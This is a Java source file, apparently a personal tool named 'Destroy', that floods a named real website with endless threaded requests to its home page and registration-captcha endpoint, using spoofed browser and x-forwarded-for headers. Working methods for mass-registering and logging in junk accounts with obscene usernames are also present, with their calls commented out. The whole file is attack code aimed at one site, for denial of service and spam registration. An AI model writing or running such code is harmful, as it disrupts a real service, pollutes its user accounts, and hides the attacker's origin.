package net.dingyabin.thread;

import com.alibaba.fastjson.JSONObject;
import com.google.common.collect.Lists;
import net.wecash.utils.HTTPClient;
import org.apache.commons.lang3.RandomUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.http.Header;
import org.apache.http.message.BasicHeader;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * Created by MrDing
 * Date: 2020/3/17.
 * Time:1:00
 */
public class Destroy {

    private static ThreadPoolExecutor executorService = new ThreadPoolExecutor(3, 3,
            0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>(5000), new ThreadPoolExecutor.DiscardPolicy());

//    private static ThreadPoolExecutor loginExecutorService = new ThreadPoolExecutor(1, 1,
//           0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>());


    private static Header[] commonHeaders = new BasicHeader[]{
            new BasicHeader(":authority", "www.tyjys.com"),
            new BasicHeader(":method", "POST"),
            new BasicHeader(":scheme", "https"),
            new BasicHeader("accept", "application/json, text/javascript, */*; q=0.01"),
            new BasicHeader("accept-encoding", "gzip, deflate, br"),
            new BasicHeader("accept-language", "zh-CN,zh;q=0.8"),
            new BasicHeader("content-type", "application/x-www-form-urlencoded; charset=UTF-8"),
            new BasicHeader("origin", "https://www.tyjys.com"),
            new BasicHeader("user-agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"),
            new BasicHeader("x-requested-with", "XMLHttpRequest"),
            new BasicHeader("x-forwarded-for", "127.0.0.1")
    };



    public static void main(String[] args) throws Exception {
        while (true){
//            String nextLong = RandomUtils.nextLong(1000L, 9000000000000L) + "";
//            String name = "操你妈操你妈操你妈" + nextLong + "_" + i;
//            executorService.submit(() -> {
//                boolean reg = reg(name, name, nextLong);
//                if (reg) {
//                    System.out.println("--*****************---" + name);
//                    //登录
//                    //loginExecutorService.submit(() -> login(name, name));
//                }
//            });

            executorService.submit(Destroy::code);
            executorService.submit(Destroy::home);

            if (executorService.getQueue().size() > 20) {
                System.out.println("线程任务积压，休息15s");
                sleep();
            }
        }
    }



    private static void sleep(){
        try {
            Thread.sleep(RandomUtils.nextLong(13000, 15000));
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }




    private static void login(String name ,String pwd) {
        try {
            Map<String, String> loginMap = new HashMap<>();
            loginMap.put("username", name);
            loginMap.put("password", pwd);
            loginMap.put("referurl", "https://www.tyjys.com/");
            loginMap.put("website", "website");

            HTTPClient.postMap("https://www.tyjys.com/user", loginMap, Lists.asList(new BasicHeader(":path", "/user"), commonHeaders).toArray(new Header[0]));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private static boolean reg(String name, String pwd, String email) {
        try {
            Map<String, String> map = new HashMap<>();
            map.put("username", name);
            map.put("password", pwd);
            map.put("password2", pwd);
            map.put("users_[email_2]", email + "1234567890987654321@qq.com");
            String s = HTTPClient.postMap("https://www.tyjys.com/reg", map, Lists.asList(new BasicHeader(":path", "/reg"), commonHeaders).toArray(new Header[0]));
            if (StringUtils.isNotBlank(s) && s.startsWith("{")) {
                JSONObject jsonObject = JSONObject.parseObject(s);
                return "注册成功！".equals(jsonObject.getString("msg"));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }


    private static void code() {
        try {
            int r = RandomUtils.nextInt(0, 100);
            HTTPClient.get("https://www.tyjys.com/api/Ajax/vertify/type/users_reg.html?r=" + r, null, Lists.asList(new BasicHeader(":path", "/api/Ajax/vertify/type/users_reg.html?r=" + r), commonHeaders).toArray(new Header[0]));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private static void home() {
        try {
             HTTPClient.get("https://www.tyjys.com", null, Lists.asList(new BasicHeader(":path", "/"), commonHeaders).toArray(new Header[0]));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



}
